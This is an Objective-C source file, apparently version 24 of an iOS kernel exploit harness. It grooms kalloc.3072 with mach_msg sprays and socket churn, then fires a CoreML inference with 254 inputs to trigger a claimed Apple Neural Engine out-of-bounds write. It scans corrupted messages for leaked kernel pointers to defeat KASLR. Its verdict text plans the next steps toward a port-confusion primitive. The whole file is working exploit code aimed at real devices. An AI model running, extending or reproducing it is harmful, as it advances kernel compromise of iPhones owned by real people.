// P044AksKaslrReach.m
// v24 — final conversion harness.
//
// Ledger (churn-conditioned, device-verified):
//   v20 mixed   -> HIT, HIT
//   v21 tail    -> 0/0/0 (ordering poison)
//   v22 mixed   -> HIT (2045), HIT (2046)
//   v23 tail-8  -> 0s — root-caused: corrupted complex kmsgs are REJECTED by
//     the kernel on recv and our scanner silently dropped them. The signal
//     was being discarded, not absent.
//
// v24 changes:
//   1. scanVictims port-kind branch: recv errors other than timeout/invalid
//      = KERNEL REJECTED CORRUPTED DESCRIPTORS = conversion signal.
//   2. Watcher thread: continuous recv over queued drains for 45s after
//      fire (delayed landings: +27s/+52s/+12min/cross-zone all witnessed).
//   3. Events recorded under a mutex: inline diff, port rejection signal,
//      drain corruption — printed at verdict.
// Retained: churn seed (spray through fire), mixed layout + last-8 tail,
//   fixed KPTR scan, drain cleanup, v18 logging contract.
//
// Isolation: one tap per force-quit. PANIC POSSIBLE at fire and at
// port-kind recv (a panic = kernel dereferenced our bytes = evidence).
// No OOL memory descriptors. No syscall 536.

#import "P044AksKaslrReach.h"
#import "A14_23F77_LabOffsets.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"

#import <Foundation/Foundation.h>
#import <CoreML/CoreML.h>
#import <fcntl.h>
#import <mach/mach.h>
#import <netinet/in.h>
#import <netinet/icmp6.h>
#import <pthread.h>
#import <string.h>
#import <sys/resource.h>
#import <sys/socket.h>
#import <unistd.h>
#import <stdlib.h>

#define P044_BUILD @"p044-coreml-v24"

#define INPUT_COUNT 254
#define PAYLOAD_SIZE 0xb80
#define PAIR_COUNT 2048
#define DRAIN_COUNT 2048
#define COREML_MODEL_NAME @"XVRC27_254in_1out_addchain"

#define PORT_VICTIM_EVERY 4
#define TAIL_PORTK_COUNT 8
#define CHURN_BATCH 512
#define CHURN_SETTLE_SEC 1.0
#define WATCH_SECONDS 45.0
#define RECV_WAIT_MS_EMPTY 1
#define RECV_WAIT_MS_WORK 1000
#define EVENT_LOG_MAX 16

typedef struct {
    mach_port_t hole;
    mach_port_t victim;
    int kind;
    int done;
} pair_t;

typedef struct {
    mach_msg_header_t hdr;
    uint8_t bytes[];
} inline_msg_t;

/* complex msg: hdr 0x18 + body 0x4 + 2 port descs 0x18 + pad -> 0xb74
   kdata = 0xb74 + 0x24 = 0xb98  (P034 band, kalloc.3072) */
typedef struct {
    mach_msg_header_t hdr;
    mach_msg_body_t body;
    mach_msg_port_descriptor_t desc[2];
    uint8_t pad[PAYLOAD_SIZE - 0x40];
} port_msg_t;

typedef struct {
    int kind;                 /* 0 inline-hit 1 port-signal 2 drain-inline 3 drain-signal */
    uint32_t idx;
    kern_return_t kr;
    uint8_t body[PAYLOAD_SIZE];
} ev_t;

static ev_t g_events[EVENT_LOG_MAX];
static int g_evCount = 0;
static pthread_mutex_t g_evLock = PTHREAD_MUTEX_INITIALIZER;

static void ev_push(int kind, uint32_t idx, kern_return_t kr, const uint8_t *body) {
    pthread_mutex_lock(&g_evLock);
    if (g_evCount < EVENT_LOG_MAX) {
        ev_t *e = &g_events[g_evCount];
        e->kind = kind;
        e->idx = idx;
        e->kr = kr;
        if (body) {
            memcpy(e->body, body, PAYLOAD_SIZE);
        } else {
            memset(e->body, 0, PAYLOAD_SIZE);
        }
        g_evCount++;
    }
    pthread_mutex_unlock(&g_evLock);
}

#pragma mark - Logging (v18 contract: whole-buffer rewrite)

static void p044_write_log(NSString *out) {
    NSString *docs = NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    NSString *path = [docs stringByAppendingPathComponent:@"p044_aks_kaslr_reach_log.txt"];
    int fd = open(path.fileSystemRepresentation, O_CREAT | O_WRONLY | O_TRUNC, 0644);
    if (fd >= 0) {
        const char *s = out.UTF8String;
        if (s) write(fd, s, strlen(s));
        fcntl(fd, F_FULLFSYNC);
        close(fd);
    }
}

#pragma mark - Payload / port / message helpers

static void fill_payload(uint8_t *p, uint32_t index, uint32_t role) {
    for (size_t i = 0; i < PAYLOAD_SIZE; i++) {
        p[i] = (uint8_t)(0xa5u ^ (uint8_t)(index * 17u) ^
                         (uint8_t)(role * 0x31u) ^ (uint8_t)(i * 13u));
    }
    uint64_t magic = role ? 0x5649435458563237ULL : 0x484f4c4558563237ULL;
    uint64_t marker = 0x4141414141414141ULL;
    uint64_t len = PAYLOAD_SIZE;
    memcpy(p + 0x00, &magic, sizeof(magic));
    memcpy(p + 0x08, &index, sizeof(index));
    memcpy(p + 0x0c, &role, sizeof(role));
    memcpy(p + 0x10, &len, sizeof(len));
    memcpy(p + 0x18, &marker, sizeof(marker));
}

static mach_port_t make_port(void) {
    mach_port_t port = MACH_PORT_NULL;
    kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    if (kr != KERN_SUCCESS) return MACH_PORT_NULL;
    kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
    if (kr != KERN_SUCCESS) {
        mach_port_destroy(mach_task_self(), port);
        return MACH_PORT_NULL;
    }
    return port;
}

static void send_msg(mach_port_t port, uint32_t index, uint32_t role) {
    size_t msg_size = sizeof(inline_msg_t) + PAYLOAD_SIZE;
    inline_msg_t *msg = calloc(1, msg_size);
    if (!msg) return;

    msg->hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
    msg->hdr.msgh_size = (mach_msg_size_t)msg_size;
    msg->hdr.msgh_remote_port = port;
    msg->hdr.msgh_id = (mach_msg_id_t)(0x58560000u | ((role & 0xffu) << 8) | (index & 0xffu));
    fill_payload(msg->bytes, index, role);

    mach_msg(&msg->hdr, MACH_SEND_MSG, (mach_msg_size_t)msg_size, 0, MACH_PORT_NULL, 0, MACH_PORT_NULL);
    free(msg);
}

static void send_port_msg(mach_port_t port, mach_port_t rightA, mach_port_t rightB,
                          uint32_t index) {
    size_t msg_size = sizeof(port_msg_t);
    port_msg_t *msg = calloc(1, msg_size);
    if (!msg) return;

    msg->hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) |
                         MACH_MSGH_BITS_COMPLEX;
    msg->hdr.msgh_size = (mach_msg_size_t)msg_size;
    msg->hdr.msgh_remote_port = port;
    msg->hdr.msgh_id = (mach_msg_id_t)(0x58570000u | (index & 0xffu));
    msg->body.msgh_descriptor_count = 2;
    msg->desc[0].name = rightA;
    msg->desc[0].disposition = MACH_MSG_TYPE_COPY_SEND;
    msg->desc[0].type = MACH_MSG_PORT_DESCRIPTOR;
    msg->desc[1].name = rightB;
    msg->desc[1].disposition = MACH_MSG_TYPE_COPY_SEND;
    msg->desc[1].type = MACH_MSG_PORT_DESCRIPTOR;

    mach_msg(&msg->hdr, MACH_SEND_MSG, (mach_msg_size_t)msg_size, 0, MACH_PORT_NULL, 0, MACH_PORT_NULL);
    free(msg);
}

static kern_return_t recv_msg(mach_port_t port, uint8_t *payload, uint32_t waitMs) {
    size_t msg_size = sizeof(inline_msg_t) + PAYLOAD_SIZE + sizeof(mach_msg_max_trailer_t) + 0x100;
    inline_msg_t *msg = calloc(1, msg_size);
    if (!msg) return MACH_MSG_SIZE_MAX;

    kern_return_t kr = mach_msg(&msg->hdr, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0,
                                (mach_msg_size_t)msg_size, port, waitMs, MACH_PORT_NULL);
    if (kr == MACH_MSG_SUCCESS && payload) {
        if (msg->hdr.msgh_size < sizeof(mach_msg_header_t) + PAYLOAD_SIZE) {
            kr = MACH_RCV_TOO_LARGE;
        } else {
            memcpy(payload, msg->bytes, PAYLOAD_SIZE);
        }
    }
    free(msg);
    return kr;
}

static void hexdump16(uint8_t *buf, size_t start, NSMutableString *out) {
    size_t base = start & ~(size_t)0xf;
    for (size_t off = base; off < base + 0x40 && off < PAYLOAD_SIZE; off += 0x10) {
        [out appendFormat:@"    %04zx:", off];
        for (size_t k = 0; k < 0x10 && off + k < PAYLOAD_SIZE; k++) {
            [out appendFormat:@" %02x", buf[off + k]];
        }
        [out appendString:@"\n"];
    }
}

static void kptr_scan(uint8_t *buf, uint32_t victim, NSMutableString *out) {
    for (size_t j = 0; j + 8 <= PAYLOAD_SIZE; j += 4) {
        uint64_t val = *(uint64_t *)&buf[j];
        if ((uint32_t)(val >> 32) == 0xfffffff0u) {
            [out appendFormat:@"    *** KPTR victim=%u body[0x%zx] = 0x%016llx ***\n",
                victim, j, (unsigned long long)val];
        }
    }
}

#pragma mark - Churn + watcher threads

static volatile int g_churn_go = 0;

static void *churn_worker(void *arg) {
    while (g_churn_go) {
        int fds[CHURN_BATCH];
        for (int i = 0; i < CHURN_BATCH; i++) {
            fds[i] = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
        }
        for (int i = 0; i < CHURN_BATCH; i++) {
            if (fds[i] >= 0) close(fds[i]);
        }
        usleep(1);
    }
    return NULL;
}

/* Watcher: continuous recv over the queued DRAIN array while the delayed
   write is in flight. Inline drain corrupted -> event 2. Port-kind drain
   rejected by the kernel -> event 3. Runs until g_watch_go = 0. */
static mach_port_t *g_watchDrain = NULL;
static uint8_t *g_watchScanned = NULL;
static volatile int g_watch_go = 0;

static void *watch_worker(void *arg) {
    uint8_t expected[PAYLOAD_SIZE];
    uint8_t actual[PAYLOAD_SIZE];
    while (g_watch_go) {
        if (g_watchDrain) {
            for (uint32_t i = 0; i < DRAIN_COUNT; i++) {
                if (!g_watchDrain[i] || g_watchScanned[i]) continue;
                kern_return_t kr = recv_msg(g_watchDrain[i], actual, 0);
                if (kr == MACH_MSG_SUCCESS) {
                    g_watchScanned[i] = 1;
                    fill_payload(expected, i, 2);
                    if (memcmp(actual, expected, PAYLOAD_SIZE) != 0) {
                        kptr_scan(actual, i, NULL);
                        ev_push(2, i, kr, actual);
                    }
                } else if (kr != MACH_RCV_TIMED_OUT && kr != MACH_RCV_INVALID_NAME) {
                    g_watchScanned[i] = 1;
                    ev_push(3, i, kr, NULL);
                }
            }
        }
        usleep(0);
    }
    return NULL;
}

#pragma mark - Implementation

@implementation P044AksKaslrReach

+ (NSURL *)findCoreMLModelURL:(NSMutableString *)out {
    [out appendString:@"\n=== PHASE 1: Find CoreML model ===\n"];

    NSBundle *bundle = [NSBundle mainBundle];

    NSURL *compiledURL = [bundle URLForResource:COREML_MODEL_NAME withExtension:@"mlmodelc"];
    if (compiledURL) {
        [out appendFormat:@"  Found compiled model: %@\n", compiledURL.path];
        return compiledURL;
    }

    NSURL *sourceURL = [bundle URLForResource:COREML_MODEL_NAME withExtension:@"mlmodel"];
    if (!sourceURL) {
        NSString *sourcePath = [bundle.resourcePath stringByAppendingPathComponent:
                               [COREML_MODEL_NAME stringByAppendingPathExtension:@"mlmodel"]];
        if ([[NSFileManager defaultManager] fileExistsAtPath:sourcePath]) {
            sourceURL = [NSURL fileURLWithPath:sourcePath];
        }
    }

    if (!sourceURL) {
        [out appendString:@"  STOP: No .mlmodelc or .mlmodel in bundle\n"];
        [out appendFormat:@"  Bundle: %@\n", bundle.bundlePath];
        return nil;
    }

    [out appendFormat:@"  Found source model: %@\n", sourceURL.path];
    NSError *err = nil;
    NSURL *compiled = [MLModel compileModelAtURL:sourceURL error:&err];
    if (!compiled) {
        [out appendFormat:@"  STOP: compile failed: %@\n", err.localizedDescription];
        return nil;
    }
    [out appendFormat:@"  Compiled to: %@\n", compiled.path];
    return compiled;
}

+ (MLModel *)loadCoreMLModel:(NSURL *)modelURL out:(NSMutableString *)out {
    [out appendString:@"\n=== PHASE 2: Load CoreML model ===\n"];

    MLModelConfiguration *configuration = [[MLModelConfiguration alloc] init];
    configuration.computeUnits = MLComputeUnitsAll;

    NSError *err = nil;
    MLModel *model = [MLModel modelWithContentsOfURL:modelURL
                                       configuration:configuration
                                               error:&err];
    if (!model) {
        [out appendFormat:@"  STOP: MLModel load failed: %@\n", err.localizedDescription];
        return nil;
    }

    [out appendString:@"  MLModel loaded successfully\n"];
    return model;
}

+ (MLDictionaryFeatureProvider *)createFeatures:(NSMutableString *)out {
    [out appendFormat:@"\n=== PHASE 3: Create %u input features ===\n", INPUT_COUNT];

    NSMutableDictionary<NSString *, MLFeatureValue *> *features =
        [NSMutableDictionary dictionaryWithCapacity:INPUT_COUNT];
    double expected = 0.0;

    for (uint32_t i = 0; i < INPUT_COUNT; i++) {
        double value = (double)(i + 1);
        NSString *name = [NSString stringWithFormat:@"x_%03u", i];

        NSError *err = nil;
        MLMultiArray *array = [[MLMultiArray alloc] initWithShape:@[@1]
                                                        dataType:MLMultiArrayDataTypeDouble
                                                           error:&err];
        if (!array) {
            [out appendFormat:@"  STOP: MLMultiArray failed for %@: %@\n",
                name, err.localizedDescription];
            return nil;
        }
        array[0] = @(value);
        features[name] = [MLFeatureValue featureValueWithMultiArray:array];
        expected += value;
    }

    [out appendFormat:@"  Created %u features, expected sum=%.0f\n", INPUT_COUNT, expected];

    NSError *err = nil;
    MLDictionaryFeatureProvider *provider =
        [[MLDictionaryFeatureProvider alloc] initWithDictionary:features error:&err];
    if (!provider) {
        [out appendFormat:@"  STOP: FeatureProvider failed: %@\n", err.localizedDescription];
        return nil;
    }

    [out appendString:@"  FeatureProvider created\n"];
    return provider;
}

/* v24 spray: proven mixed layout + last-8 port-kind tail. */
+ (pair_t *)sprayOut:(NSMutableString *)out drain:(mach_port_t **)outDrain {
    [out appendFormat:@"\n=== PHASE 4: Spray mach_msg pairs=%u payload=0x%x (every %u victim = port-kind + last %u port-kind) ===\n",
        PAIR_COUNT, PAYLOAD_SIZE, PORT_VICTIM_EVERY, TAIL_PORTK_COUNT];

    mach_port_t *drain = calloc(DRAIN_COUNT, sizeof(*drain));
    pair_t *pairs = calloc(PAIR_COUNT, sizeof(*pairs));
    if (!drain || !pairs) {
        free(drain);
        free(pairs);
        return NULL;
    }

    int drainOK = 0;
    for (uint32_t i = 0; i < DRAIN_COUNT; i++) {
        drain[i] = make_port();
        if (drain[i]) {
            send_msg(drain[i], i, 2);
            drainOK++;
        }
    }
    [out appendFormat:@"  drain: %d/%u kmsgs queued (late-window sensors)\n", drainOK, DRAIN_COUNT];

    int pairOK = 0, portKind = 0;
    for (uint32_t i = 0; i < PAIR_COUNT; i++) {
        pairs[i].hole = make_port();
        pairs[i].victim = make_port();
        pairs[i].kind = (i >= (PAIR_COUNT - TAIL_PORTK_COUNT) ||
                         (i % PORT_VICTIM_EVERY == 3)) ? 1 : 0;
        pairs[i].done = 0;
        if (pairs[i].hole && pairs[i].victim) {
            send_msg(pairs[i].hole, i, 0);
            if (pairs[i].kind == 1) {
                mach_port_t rightA = make_port();
                mach_port_t rightB = make_port();
                if (rightA && rightB) {
                    send_port_msg(pairs[i].victim, rightA, rightB, i);
                    portKind++;
                }
                if (rightA) mach_port_destroy(mach_task_self(), rightA);
                if (rightB) mach_port_destroy(mach_task_self(), rightB);
            } else {
                send_msg(pairs[i].victim, i, 1);
            }
            pairOK++;
        }
    }
    [out appendFormat:@"  spray: %d/%u pairs (inline=%d portkind=%d)\n",
        pairOK, PAIR_COUNT, pairOK - portKind, portKind];

    [out appendString:@"  Freeing holes to create empty kalloc.3072 slots...\n"];
    for (uint32_t i = 0; i < PAIR_COUNT; i++) {
        if (pairs[i].hole) recv_msg(pairs[i].hole, NULL, RECV_WAIT_MS_WORK);
    }
    sync();

    [out appendString:@"  Spray complete. Holes freed.\n"];
    *outDrain = drain;
    return pairs;
}

/* t+0 victim scan. Inline: only success matters (diff). Port-kind: BOTH
   success (rare) AND non-timeout kernel rejection are conversion signals. */
+ (int)scanVictims:(pair_t *)pairs out:(NSMutableString *)out {
    uint8_t expected[PAYLOAD_SIZE];
    uint8_t actual[PAYLOAD_SIZE];
    int hits = 0;

    for (uint32_t i = 0; i < PAIR_COUNT; i++) {
        if (!pairs[i].victim || pairs[i].done) continue;

        kern_return_t kr = recv_msg(pairs[i].victim, actual, RECV_WAIT_MS_WORK);

        if (pairs[i].kind == 0) {
            if (kr != MACH_MSG_SUCCESS) continue;
            pairs[i].done = 1;
            fill_payload(expected, i, 1);
            size_t first = SIZE_MAX;
            size_t changed = 0;
            for (size_t j = 0; j < PAYLOAD_SIZE; j++) {
                if (actual[j] != expected[j]) {
                    if (first == SIZE_MAX) first = j;
                    changed++;
                }
            }
            if (first != SIZE_MAX) {
                hits++;
                [out appendFormat:@"  HIT inline victim=%u first_diff=0x%zx changed=%zu\n",
                    i, first, changed];
                hexdump16(actual, first, out);
                kptr_scan(actual, (uint32_t)i, out);
            }
        } else {
            if (kr == MACH_MSG_SUCCESS) {
                pairs[i].done = 1;
                hits++;
                [out appendFormat:@"  HIT port-kind victim=%u (recv OK — desc area follows)\n", i];
                hexdump16(actual, 0, out);
                kptr_scan(actual, (uint32_t)i, out);
            } else if (kr != MACH_RCV_TIMED_OUT && kr != MACH_RCV_INVALID_NAME) {
                /* kernel rejected the corrupted complex kmsg = it CONSUMED our bytes */
                pairs[i].done = 1;
                hits++;
                [out appendFormat:
                    @"  *** PORT-KIND SIGNAL victim=%u recv kr=0x%x — KERNEL REJECTED CORRUPTED DESCRIPTORS ***\n",
                    i, kr];
                [out appendString:@"      kernel CONSUMED our bytes. This is the conversion event.\n"];
            }
            /* timed out = port empty = normal; leave for the watcher */
        }
    }
    return hits;
}

+ (NSString *)tap {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"=== p044 session %@ BUILD %@ ===\n",
        LabLocalMilitaryNow(), P044_BUILD];
    [out appendString:@"CoreML API approach + mach_msg spray.\n"];
    [out appendString:@"Uses .mlmodelc bundle. 254 inputs -> CheckandPrewire OOB.\n"];
    [out appendString:@"v24: churn + mixed + tail-8 + rejection-signal scan + late watcher.\n\n"];

    NSString *stop = [LabDeviceProfile stopUnlessA14_23F77:@"p044"];
    if (stop) { [out appendString:stop]; p044_write_log(out); return out; }
    [out appendString:[LabDeviceProfile identBlock]];
    p044_write_log(out);

    // 1. Find model
    NSURL *modelURL = [self findCoreMLModelURL:out];
    if (!modelURL) { p044_write_log(out); return out; }

    // 2. Load model
    MLModel *model = [self loadCoreMLModel:modelURL out:out];
    if (!model) { p044_write_log(out); return out; }

    // 3. Create features
    MLDictionaryFeatureProvider *provider = [self createFeatures:out];
    if (!provider) { p044_write_log(out); return out; }

    // 4. Start heap churn BEFORE spray
    [out appendString:@"\n=== PHASE 4c: heap churn seed (LuminaKRW effect) ===\n"];
    struct rlimit rl = { 0x10000, 0x10000 };
    setrlimit(RLIMIT_NOFILE, &rl);
    g_churn_go = 1;
    pthread_t churnTid;
    pthread_create(&churnTid, NULL, churn_worker, NULL);
    [NSThread sleepForTimeInterval:CHURN_SETTLE_SEC];
    [out appendFormat:@"  churn running (%d-socket create/close loop)\n", CHURN_BATCH];
    p044_write_log(out);

    // 5. Spray
    mach_port_t *drain = NULL;
    pair_t *pairs = [self sprayOut:out drain:&drain];
    if (!pairs || !drain) {
        [out appendString:@"  STOP: Spray failed\n"];
        g_churn_go = 0;
        pthread_join(churnTid, NULL);
        p044_write_log(out);
        return out;
    }
    p044_write_log(out);

    // 6. FIRE
    [out appendString:@"\n=== PHASE 5: FIRE — CoreML inference (254 inputs) ===\n"];
    [out appendString:@">>> FIRING predictionFromFeatures with 254 inputs <<<\n"];
    [out appendString:@">>> ANE CheckandPrewire OOB write into kalloc.3072 <<<\n"];
    [out appendString:@">>> PANIC POSSIBLE — ips will have KASLR <<<\n\n"];
    p044_write_log(out);

    NSError *err = nil;
    id<MLFeatureProvider> prediction = [model predictionFromFeatures:provider error:&err];

    if (prediction) {
        [out appendString:@"  inference ok\n"];
    } else {
        [out appendFormat:@"  prediction FAILED: %@\n",
            err ? err.localizedDescription : @"<nil>"];
    }

    // 7. Immediate victim scan (t+0)
    [out appendString:@"\n=== PHASE 6: Immediate victim scan (t+0) ===\n"];
    int hits = [self scanVictims:pairs out:out];
    [out appendFormat:@"  t+0 victim hits=%d\n", hits];

    // 8. Stop churn, start late watcher over the queued drains
    g_churn_go = 0;
    pthread_join(churnTid, NULL);
    [out appendString:@"  churn stopped\n"];
    p044_write_log(out);

    g_watchDrain = drain;
    g_watchScanned = calloc(DRAIN_COUNT, 1);
    pthread_t watchTid;
    BOOL watcherStarted = NO;
    if (g_watchScanned) {
        g_watch_go = 1;
        if (pthread_create(&watchTid, NULL, watch_worker, NULL) == 0) {
            watcherStarted = YES;
        } else {
            g_watch_go = 0;
        }
    }

    if (watcherStarted) {
        [out appendFormat:@"\n=== PHASE 6b: late watcher running for %.0fs (delayed landings) ===\n",
            WATCH_SECONDS];
        p044_write_log(out);
        [NSThread sleepForTimeInterval:WATCH_SECONDS];
        g_watch_go = 0;
        pthread_join(watchTid, NULL);
        pthread_mutex_lock(&g_evLock);
        int evc = g_evCount;
        pthread_mutex_unlock(&g_evLock);
        [out appendFormat:@"  watcher events=%d\n", evc];
        p044_write_log(out);
    }

    // 9. Detailed event dump
    [out appendString:@"\n=== EVENTS ===\n"];
    pthread_mutex_lock(&g_evLock);
    for (int e = 0; e < g_evCount; e++) {
        ev_t *ev = &g_events[e];
        switch (ev->kind) {
            case 2:
                [out appendFormat:@"  DRAIN-HIT drain=%u (LATE LANDING, inline corrupted)\n", ev->idx];
                hexdump16(ev->body, 0, out);
                kptr_scan(ev->body, ev->idx, out);
                break;
            case 3:
                [out appendFormat:
                    @"  *** PORT-KIND SIGNAL drain=%u recv kr=0x%x — KERNEL REJECTED CORRUPTED DESCRIPTORS ***\n",
                    ev->idx, ev->kr];
                break;
            default:
                break;
        }
    }
    pthread_mutex_unlock(&g_evLock);
    p044_write_log(out);

    // VERDICT
    [out appendString:@"\n=== VERDICT ===\n"];
    if (hits > 0) {
        [out appendString:@"\n*** OOB WRITE CONFIRMED ***\n"];
        [out appendString:@"Fingerprint: [u32 surfaceId][u32 0xcN counter][1][1], 16B stride.\n"];
        [out appendString:@"KPTR lines above = LEAK (slide = val - unslid pin). hasKread path.\n"];
        [out appendString:@"PORT-KIND SIGNALS above = kernel consumed corrupted descriptors.\n"];
        [out appendString:@"Next: KPTR -> slide math + commitSlide. Signal -> v25 right-confusion.\n"];
    } else if (g_evCount > 0) {
        [out appendString:@"\n*** LATE-WINDOW EVENT CONFIRMED (watcher) ***\n"];
        [out appendString:@"Write lands after the tap's synchronous window — timing, not occupancy.\n"];
    } else if (prediction) {
        [out appendString:@"\nInference succeeded but no corruption detected.\n"];
    } else {
        [out appendString:@"\nNo corruption in the observation window.\n"];
    }

    // Cleanup
    [out appendString:@"\n\n=== CLEANUP ===\n"];
    for (uint32_t i = 0; i < DRAIN_COUNT; i++) {
        if (drain[i]) {
            if (!g_watchScanned || !g_watchScanned[i]) {
                recv_msg(drain[i], NULL, RECV_WAIT_MS_EMPTY);
            }
            mach_port_destroy(mach_task_self(), drain[i]);
        }
    }
    for (uint32_t i = 0; i < PAIR_COUNT; i++) {
        if (pairs[i].victim) {
            if (!pairs[i].done) {
                recv_msg(pairs[i].victim, NULL, RECV_WAIT_MS_EMPTY);
            }
            mach_port_destroy(mach_task_self(), pairs[i].victim);
        }
        if (pairs[i].hole) mach_port_destroy(mach_task_self(), pairs[i].hole);
    }
    free(pairs);
    free(drain);
    if (g_watchScanned) {
        free(g_watchScanned);
        g_watchScanned = NULL;
    }
    g_watchDrain = NULL;
    [out appendString:@"  cleanup done\n"];

    p044_write_log(out);
    return out;
}

@end
